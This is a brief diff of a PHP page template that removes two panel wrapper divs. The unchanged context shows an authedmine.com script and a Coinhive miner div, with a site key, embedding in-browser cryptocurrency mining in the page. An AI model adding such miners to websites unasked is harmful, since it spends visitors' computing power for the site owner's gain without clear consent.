@@ -68,8 +68,6 @@ include("layout/c794bc6c9a3eccc2.php");
 -->
 
 <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-<div class="panel panel-primary">
-  <div class="panel-body">
 <div class="coinhive-miner" 
   style="position: absolute;top: 200px;height: 100%;border-collapse: collapse;display: table;width: 100%;min-width: 200px"
   data-key="dmQTh9BimGpFmAdq4RUPFgUfjH0SYIt2"
